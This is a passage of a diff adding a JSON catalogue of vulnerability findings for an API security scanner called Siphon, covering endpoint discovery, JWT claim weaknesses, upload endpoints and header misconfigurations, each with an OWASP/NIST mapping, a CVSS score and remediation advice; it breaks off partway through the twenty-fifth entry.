@@ -1,0 +1,2446 @@
+[
+  {
+    "id": "SI-001",
+    "title": "API Endpoint Discovered (dirsearch)",
+    "severity": "INFO",
+    "category": "Reconnaissance",
+    "owasp_api": "API9:2023 Improper Inventory Management",
+    "owasp_web": null,
+    "nist": [
+      "CA-2",
+      "RA-5"
+    ],
+    "cves": [],
+    "cvss_score": 0.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+    "description": "Siphon discovered an API endpoint via directory and path brute-forcing using dirsearch. The endpoint was not necessarily documented in any provided API specification and was identified by receiving a non-404 HTTP response. Discovery of undocumented or unintended endpoints increases the attack surface available to an adversary. This finding is informational and represents an enumeration result rather than a confirmed vulnerability.",
+    "remediation": "Review all discovered endpoints and confirm each is intentional and documented. Remove or disable any endpoints that are no longer in use. Ensure API gateway or WAF rules restrict access to known-good paths. Maintain an up-to-date API inventory.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/",
+      "https://github.com/maurosoria/dirsearch"
+    ]
+  },
+  {
+    "id": "SI-002",
+    "title": "API Endpoint Discovered (Feroxbuster)",
+    "severity": "INFO",
+    "category": "Reconnaissance",
+    "owasp_api": "API9:2023 Improper Inventory Management",
+    "owasp_web": null,
+    "nist": [
+      "CA-2",
+      "RA-5"
+    ],
+    "cves": [],
+    "cvss_score": 0.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+    "description": "Siphon discovered an API endpoint via recursive content discovery using Feroxbuster. The endpoint responded with a non-404 status code during automated path enumeration. Feroxbuster performs recursive brute-forcing and can uncover deeply nested or legacy paths not surfaced by shallow scanners. Discovery of additional endpoints widens the attack surface and may expose functionality not intended for public access.",
+    "remediation": "Audit all live endpoints and compare against the official API inventory. Decommission endpoints that are no longer needed. Apply allowlist-based routing at the API gateway layer so only documented paths are reachable. Ensure staging or debug paths are not deployed to production.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/",
+      "https://github.com/epi052/feroxbuster"
+    ]
+  },
+  {
+    "id": "SI-003",
+    "title": "API Endpoint Discovered (FFUF)",
+    "severity": "INFO",
+    "category": "Reconnaissance",
+    "owasp_api": "API9:2023 Improper Inventory Management",
+    "owasp_web": null,
+    "nist": [
+      "CA-2",
+      "RA-5"
+    ],
+    "cves": [],
+    "cvss_score": 0.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+    "description": "Siphon discovered an API endpoint using FFUF (Fuzz Faster U Fool), a high-speed web fuzzer. The endpoint returned a response code indicating its existence during wordlist-based path fuzzing. FFUF is commonly used to find hidden API routes, versioned paths, and alternative content types. Each discovered endpoint is a potential pivot point for further vulnerability testing.",
+    "remediation": "Compare discovered endpoints against the authoritative API specification and remove any that are undocumented or deprecated. Implement strict path-based ACLs at the API gateway. Disable directory listing and ensure all routes are explicitly registered in the application router.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/",
+      "https://github.com/ffuf/ffuf"
+    ]
+  },
+  {
+    "id": "SI-004",
+    "title": "API Endpoint Discovered (Kiterunner)",
+    "severity": "INFO",
+    "category": "Reconnaissance",
+    "owasp_api": "API9:2023 Improper Inventory Management",
+    "owasp_web": null,
+    "nist": [
+      "CA-2",
+      "RA-5"
+    ],
+    "cves": [],
+    "cvss_score": 0.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+    "description": "Siphon discovered an API endpoint using Kiterunner, a tool purpose-built for API route discovery that replays real-world API route signatures. Unlike generic directory brute-forcers, Kiterunner uses curated wordlists derived from thousands of real APIs and supports context-aware request construction. Endpoints found via Kiterunner often represent API-specific paths that generic scanners miss, including internal or administrative routes.",
+    "remediation": "Review all Kiterunner-discovered endpoints against the official API documentation. Ensure the API gateway enforces an allowlist of permitted routes. Remove undocumented or decommissioned routes from the application. Implement authentication requirements on all non-public endpoints.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/",
+      "https://github.com/assetnote/kiterunner"
+    ]
+  },
+  {
+    "id": "SI-005",
+    "title": "API Framework Identified",
+    "severity": "INFO",
+    "category": "Reconnaissance",
+    "owasp_api": "API9:2023 Improper Inventory Management",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "SI-2"
+    ],
+    "cves": [],
+    "cvss_score": 0.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+    "description": "Siphon successfully fingerprinted the API framework in use (e.g., FastAPI, Django REST Framework, Spring Boot, Express, Laravel) through analysis of HTTP response headers, error page content, URL patterns, and response body signatures. Knowing the exact framework and version enables targeted exploitation of known CVEs and framework-specific vulnerabilities. This information materially aids an attacker in scoping follow-on attacks.",
+    "remediation": "Suppress framework-identifying headers such as X-Powered-By, Server, and custom framework headers. Customize error pages to avoid leaking framework version information. Keep the identified framework patched to the latest stable release. Apply virtual patching at the WAF layer for any known CVEs in the identified version.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/",
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/01-Information_Gathering/09-Fingerprint_Web_Application"
+    ]
+  },
+  {
+    "id": "SI-006",
+    "title": "Undocumented API Endpoint Detected",
+    "severity": "INFO",
+    "category": "Reconnaissance",
+    "owasp_api": "API9:2023 Improper Inventory Management",
+    "owasp_web": null,
+    "nist": [
+      "CA-2",
+      "CM-8",
+      "RA-5"
+    ],
+    "cves": [],
+    "cvss_score": 0.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+    "description": "Siphon detected a live API endpoint that is not present in the provided API specification (OpenAPI/Swagger). Undocumented endpoints often represent legacy functionality, shadow APIs, or development artifacts that were never formally decommissioned. These endpoints are unlikely to have undergone the same security review as documented ones and may lack proper authentication, rate limiting, or input validation. Their existence represents a governance gap in the API lifecycle.",
+    "remediation": "Perform a full audit to determine the purpose of the undocumented endpoint. If it is no longer needed, remove it immediately. If it serves a legitimate function, add it to the official API specification and subject it to the standard security review process. Implement CI/CD checks that fail builds when undocumented routes are detected.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/",
+      "https://www.zaproxy.org/docs/alerts/90005/"
+    ]
+  },
+  {
+    "id": "SI-007",
+    "title": "Undocumented HTTP Method Accepted",
+    "severity": "INFO",
+    "category": "Reconnaissance",
+    "owasp_api": "API9:2023 Improper Inventory Management",
+    "owasp_web": null,
+    "nist": [
+      "CM-6",
+      "CM-7"
+    ],
+    "cves": [],
+    "cvss_score": 0.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+    "description": "Siphon discovered that a documented API endpoint accepts an HTTP method that is not listed in the API specification. For example, a GET-only endpoint also accepts PUT or DELETE. This may indicate that the server-side framework auto-handles methods not explicitly coded, or that an older version of the endpoint accepted additional methods. Accepting undocumented methods can lead to unintended data modification or deletion.",
+    "remediation": "Configure the application and API gateway to explicitly reject HTTP methods not defined in the API specification for each endpoint. Return 405 Method Not Allowed for any method not in the allowlist. Review the endpoint's handler logic for each accepted method and ensure proper authorization is applied.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/",
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods"
+    ]
+  },
+  {
+    "id": "SI-008",
+    "title": "Undocumented API Parameter Accepted",
+    "severity": "INFO",
+    "category": "Reconnaissance",
+    "owasp_api": "API9:2023 Improper Inventory Management",
+    "owasp_web": null,
+    "nist": [
+      "CM-6",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 0.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+    "description": "Siphon detected that an API endpoint accepts a query or body parameter that is not declared in the API specification. The server processed the parameter without returning an error, suggesting the backend consumes it silently. Undocumented parameters may enable hidden functionality, alter application behavior, or bypass intended business logic. This is often a precursor to mass assignment or parameter pollution attacks.",
+    "remediation": "Implement strict input validation that rejects any parameter not explicitly defined in the API schema. Use allowlist-based parameter validation at the API gateway or middleware layer. Remove or document any legacy parameters still consumed by the backend. Review all undocumented parameters for security implications.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/",
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"
+    ]
+  },
+  {
+    "id": "SI-009",
+    "title": "Undocumented Parameter Accepted",
+    "severity": "INFO",
+    "category": "Reconnaissance",
+    "owasp_api": "API9:2023 Improper Inventory Management",
+    "owasp_web": null,
+    "nist": [
+      "CM-6",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 0.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+    "description": "Siphon detected that an API endpoint silently accepts an extra parameter that produces a changed or differentiated response compared to the baseline. This indicates the application is consuming the parameter on the server side despite it not being part of the documented API contract. Extra parameters accepted silently can indicate a mass assignment risk, hidden feature flags, or undocumented administrative controls.",
+    "remediation": "Apply strict schema validation on all incoming request parameters. Reject any parameter not included in the endpoint's schema definition. Audit the codebase for any parameters that are processed but not documented. Use an API design-first approach to ensure the specification is always the source of truth.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-010",
+    "title": "Endpoint Not in Scope File",
+    "severity": "INFO",
+    "category": "Reconnaissance",
+    "owasp_api": "API9:2023 Improper Inventory Management",
+    "owasp_web": null,
+    "nist": [
+      "CA-2",
+      "CM-8"
+    ],
+    "cves": [],
+    "cvss_score": 0.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+    "description": "Siphon discovered an endpoint that is not listed in the provided scope file. This is an informational flag indicating that testing of this endpoint may be outside the authorized engagement boundary, or that the API inventory is incomplete. Out-of-scope endpoints that are still reachable from the target host represent an inventory management gap and a potential attack vector.",
+    "remediation": "Reconcile the scope file with the actual live API surface. Update the scope definition to explicitly include or exclude each discovered endpoint. Ensure API documentation and scope definitions are kept in sync through a formal API inventory management process.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/"
+    ]
+  },
+  {
+    "id": "SI-011",
+    "title": "HTTP Method Not in Scope File",
+    "severity": "INFO",
+    "category": "Reconnaissance",
+    "owasp_api": "API9:2023 Improper Inventory Management",
+    "owasp_web": null,
+    "nist": [
+      "CA-2",
+      "CM-7"
+    ],
+    "cves": [],
+    "cvss_score": 0.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+    "description": "Siphon detected an HTTP method being accepted by a scoped endpoint that is not listed in the scope file for that endpoint. This may indicate the scope definition is incomplete or that the server accepts additional methods beyond those intended for testing. Methods not in scope that are live may be tested inadvertently or may represent unreviewed attack surface.",
+    "remediation": "Update the scope file to accurately reflect all accepted HTTP methods per endpoint. Enforce method restrictions at the server level so only documented methods are accepted. Review the authorization logic applied to each accepted method.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/"
+    ]
+  },
+  {
+    "id": "SI-012",
+    "title": "GraphQL Subscription Endpoint Detected",
+    "severity": "INFO",
+    "category": "Reconnaissance",
+    "owasp_api": "API9:2023 Improper Inventory Management",
+    "owasp_web": null,
+    "nist": [
+      "CA-2",
+      "CM-8"
+    ],
+    "cves": [],
+    "cvss_score": 0.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+    "description": "Siphon detected a GraphQL subscription endpoint, which enables real-time data push over WebSocket or Server-Sent Events. Subscription endpoints can be leveraged for data exfiltration by subscribing to sensitive data streams, may bypass rate limiting controls applied only to query/mutation paths, and can expose the server to denial-of-service through unlimited subscription connections. Their existence should be noted and each subscription authorization model reviewed.",
+    "remediation": "Ensure all GraphQL subscription resolvers enforce the same authentication and authorization checks as query and mutation resolvers. Implement rate limiting and connection count limits on the subscription endpoint. Audit subscription data streams to ensure they do not expose data the subscriber is not authorized to receive.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/",
+      "https://graphql.org/learn/subscriptions/",
+      "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-013",
+    "title": "JWT Contains jku Header",
+    "severity": "INFO",
+    "category": "Authentication \u2014 JWT",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-3",
+      "IA-5",
+      "SC-8"
+    ],
+    "cves": [
+      "CVE-2018-0114"
+    ],
+    "cvss_score": 0.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+    "description": "Siphon detected a JWT token containing a jku (JWK Set URL) header parameter. The jku header allows the token to specify an external URL from which the server should fetch the public key used to verify the token signature. While this finding is informational (the server may pin allowed jku URLs), the presence of this header indicates potential for JWKS spoofing attacks if the server does not validate the jku URL against an allowlist. This finding is escalated to SI-052 (CRITICAL) if the server was found to accept arbitrary jku values.",
+    "remediation": "If jku is required, implement strict allowlist validation of the jku URL on the server side. Reject any token whose jku value is not in the approved list. Prefer embedding the public key directly in server configuration rather than fetching it dynamically. Log and alert on any jku value that does not match the expected URL.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/jwt/algorithm-confusion",
+      "https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.2",
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
+    ]
+  },
+  {
+    "id": "SI-014",
+    "title": "JWT Missing Issued-At Claim",
+    "severity": "LOW",
+    "category": "Authentication \u2014 JWT",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-5",
+      "AC-12"
+    ],
+    "cves": [],
+    "cvss_score": 3.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N",
+    "description": "The JWT issued by the API does not include an iat (issued-at) claim. The iat claim records when the token was created and enables server-side enforcement of token age policies. Without iat, the server cannot determine how long a token has been in circulation, making it impossible to enforce maximum token age, detect token replay from older sessions, or implement clock-skew tolerances. This weakens overall token lifecycle management.",
+    "remediation": "Include the iat claim in all issued JWTs, set to the Unix timestamp at the time of issuance. Validate iat on the server side to enforce maximum token age in addition to the exp claim. Use iat together with exp to implement sliding-window session expiry policies.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://datatracker.ietf.org/doc/html/rfc7519#section-4.1.6",
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/",
+      "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-015",
+    "title": "File Upload Endpoint Detected",
+    "severity": "INFO",
+    "category": "Reconnaissance",
+    "owasp_api": "API9:2023 Improper Inventory Management",
+    "owasp_web": "A04:2021 Insecure Design",
+    "nist": [
+      "CM-7",
+      "SI-3",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 0.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+    "description": "Siphon identified an API endpoint that accepts file uploads (multipart/form-data or binary body). File upload endpoints are high-value targets because they can be leveraged for unrestricted file upload attacks, path traversal, server-side code execution, and storage exhaustion. The presence of this endpoint is noted for targeted manual testing of upload restrictions, file type validation, and storage path controls.",
+    "remediation": "Enforce strict file type validation using magic bytes rather than extension or MIME type alone. Store uploaded files outside the web root in a sandboxed directory. Rename uploaded files to random identifiers. Scan uploaded files with antivirus/antimalware before storing. Implement size limits and rate limiting on upload endpoints. Require authentication for all upload functionality.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files"
+    ]
+  },
+  {
+    "id": "SI-016",
+    "title": "Potential Undocumented Upload Endpoint Discovered",
+    "severity": "INFO",
+    "category": "Reconnaissance",
+    "owasp_api": "API9:2023 Improper Inventory Management",
+    "owasp_web": "A04:2021 Insecure Design",
+    "nist": [
+      "CM-7",
+      "CM-8",
+      "SI-3"
+    ],
+    "cves": [],
+    "cvss_score": 0.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+    "description": "Siphon discovered a potential file upload endpoint that is not listed in the API specification. The endpoint was identified through path pattern matching (e.g., paths containing 'upload', 'import', 'attach', 'file') or by observing multipart/form-data handling. Undocumented upload endpoints often bypass the security controls applied to documented ones and may represent legacy functionality with weaker validation. This endpoint warrants immediate manual review.",
+    "remediation": "Determine the purpose of the undocumented upload endpoint. If it is no longer needed, remove it. If legitimate, add it to the API specification and subject it to full security review including file type validation, authentication enforcement, and storage security. Implement monitoring for upload activity on this endpoint.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/",
+      "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-017",
+    "title": "JWT Missing Expiry Claim",
+    "severity": "LOW",
+    "category": "Authentication \u2014 JWT",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-5",
+      "AC-12",
+      "SC-23"
+    ],
+    "cves": [],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+    "description": "The JWT issued by the API does not contain an exp (expiration) claim. Without an expiration claim, the token is theoretically valid indefinitely. An attacker who intercepts or steals a token (via XSS, network interception, log leakage, or insider threat) can use it perpetually without any time-based invalidation occurring. This violates the principle of least privilege as applied to authentication tokens and significantly increases the blast radius of any token compromise.",
+    "remediation": "Include an exp claim in all issued JWTs with an appropriate short-lived expiry (e.g., 15 minutes for access tokens, 24 hours for refresh tokens). Validate the exp claim server-side on every request. Implement token refresh logic for clients so that short-lived access tokens can be renewed using longer-lived refresh tokens. Never issue non-expiring tokens in production.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://datatracker.ietf.org/doc/html/rfc7519#section-4.1.4",
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/",
+      "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-018",
+    "title": "Header Data Leakage: Server",
+    "severity": "LOW",
+    "category": "Information Disclosure",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "CM-7",
+      "SI-12"
+    ],
+    "cves": [],
+    "cvss_score": 3.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "description": "The API response includes a Server HTTP header that discloses the web server software and version (e.g., Apache/2.4.51, nginx/1.21.3). This information assists an attacker in identifying the server technology stack and cross-referencing against known CVEs for that exact version. While not directly exploitable, version disclosure lowers the bar for targeted exploitation by eliminating reconnaissance effort.",
+    "remediation": "Configure the web server to suppress or mask the Server header. In nginx, set 'server_tokens off'. In Apache, set 'ServerTokens Prod' and 'ServerSignature Off'. Configure IIS to remove the Server header via HTTP response headers settings. Replace the header value with a generic string if complete removal is not possible.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/01-Information_Gathering/02-Fingerprint_Web_Server",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-019",
+    "title": "Header Data Leakage: Via",
+    "severity": "LOW",
+    "category": "Information Disclosure",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "CM-7",
+      "SI-12"
+    ],
+    "cves": [],
+    "cvss_score": 3.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "description": "The API response includes a Via HTTP header that reveals information about intermediate proxies, load balancers, or CDN nodes in the request path. The Via header can expose internal hostnames, proxy software versions, or network topology that assists an attacker in mapping internal infrastructure. This information can be used to identify internal services, bypass CDN protections by directly targeting origin servers, or craft targeted attacks against specific proxy versions.",
+    "remediation": "Configure reverse proxies and CDN edge nodes to suppress or rewrite the Via header before forwarding responses to clients. If Via is required for debugging purposes, ensure it only contains generic identifiers rather than internal hostnames or software versions. Use network segmentation to prevent direct access to origin servers bypassing the CDN.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Via",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-020",
+    "title": "Header Data Leakage: X-Powered-By",
+    "severity": "LOW",
+    "category": "Information Disclosure",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "CM-7",
+      "SI-12"
+    ],
+    "cves": [],
+    "cvss_score": 3.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "description": "The API response includes an X-Powered-By header that discloses the application framework or runtime (e.g., PHP/8.1.0, ASP.NET, Express). This information enables an attacker to identify the specific framework in use and correlate it against known vulnerabilities for that version. X-Powered-By is a non-standard header set by frameworks by default and provides no functional benefit to legitimate clients.",
+    "remediation": "Remove the X-Powered-By header at the framework or server level. In Express.js, call 'app.disable(\"x-powered-by\")'. In PHP, set 'expose_php = Off' in php.ini. In ASP.NET, remove the X-Powered-By header in the web.config customHeaders section. Alternatively, strip the header at the reverse proxy or WAF layer.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/01-Information_Gathering/09-Fingerprint_Web_Application",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-021",
+    "title": "Header Data Leakage: X-AspNet-Version",
+    "severity": "LOW",
+    "category": "Information Disclosure",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "CM-7",
+      "SI-12"
+    ],
+    "cves": [],
+    "cvss_score": 3.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "description": "The API response includes an X-AspNet-Version header disclosing the exact version of the ASP.NET runtime in use. This version string enables targeted exploitation of known ASP.NET vulnerabilities specific to that version, including deserialization bugs, ViewState tampering vulnerabilities, and padding oracle attacks. The header provides no functional value to clients and represents unnecessary information exposure.",
+    "remediation": "Disable the X-AspNet-Version header by adding '<httpRuntime enableVersionHeader=\"false\" />' to the system.web section of web.config. Additionally configure IIS to remove the X-Powered-By and Server headers via customHeaders configuration. Keep ASP.NET runtime patched to the latest stable version regardless of header suppression.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/01-Information_Gathering/09-Fingerprint_Web_Application",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/",
+      "https://docs.microsoft.com/en-us/dotnet/api/system.web.httpruntime.enableversionheader"
+    ]
+  },
+  {
+    "id": "SI-022",
+    "title": "Permissive Security Header: Content-Security-Policy",
+    "severity": "LOW",
+    "category": "Security Headers",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "SC-5",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 3.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",
+    "description": "The API response includes a Content-Security-Policy header, but the policy is overly permissive (e.g., contains 'unsafe-inline', 'unsafe-eval', wildcard sources like '*', or 'data:' in script-src). A permissive CSP reduces protection against Cross-Site Scripting (XSS) attacks compared to a strict policy. While the header is present, its configuration does not provide meaningful protection against script injection.",
+    "remediation": "Harden the CSP to remove 'unsafe-inline' and 'unsafe-eval' from script-src directives. Use nonces or hashes for inline scripts instead of blanket unsafe-inline permission. Restrict source allowlists to specific trusted domains. Use 'strict-dynamic' for modern browsers. Test the policy using Google's CSP Evaluator before deploying. Apply CSP to all API responses that return HTML content.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html",
+      "https://csp-evaluator.withgoogle.com/",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-023",
+    "title": "Permissive Security Header: Strict-Transport-Security",
+    "severity": "LOW",
+    "category": "Security Headers",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A02:2021 Cryptographic Failures",
+    "nist": [
+      "CM-6",
+      "SC-8",
+      "SC-28"
+    ],
+    "cves": [],
+    "cvss_score": 3.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "description": "The API response includes a Strict-Transport-Security (HSTS) header, but it is configured with a very short max-age value (typically less than one year), lacks the 'includeSubDomains' directive, or lacks 'preload'. A weak HSTS configuration leaves a window during which users can be downgraded to HTTP via SSL stripping attacks. The presence of the header is positive, but the permissive configuration reduces its protective value.",
+    "remediation": "Set the HSTS max-age to at least 31536000 seconds (one year). Add the 'includeSubDomains' directive to protect all subdomains. Consider adding 'preload' and submitting the domain to the HSTS preload list at https://hstspreload.org. Ensure HSTS is only set over HTTPS connections and never over HTTP.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html",
+      "https://hstspreload.org/",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-024",
+    "title": "Permissive Security Header: X-Frame-Options",
+    "severity": "LOW",
+    "category": "Security Headers",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 3.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",
+    "description": "The API response includes an X-Frame-Options header set to ALLOWFROM or a value other than DENY or SAMEORIGIN. ALLOWFROM has inconsistent browser support and may not provide effective clickjacking protection in all browsers. A permissive or inconsistent X-Frame-Options value reduces protection against UI redress attacks where the API's responses are framed in an attacker-controlled page.",
+    "remediation": "Set X-Frame-Options to DENY if the content should never be framed, or SAMEORIGIN if framing from the same origin is required. Prefer using the Content-Security-Policy frame-ancestors directive as a modern replacement, as it offers more granular control and is consistently supported. Remove ALLOWFROM configurations entirely.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html",
+      "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-025",
+    "title": "Permissive Security Header: X-Content-Type-Options",
+    "severity": "LOW",
+    "category": "Security Headers",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 2.6,
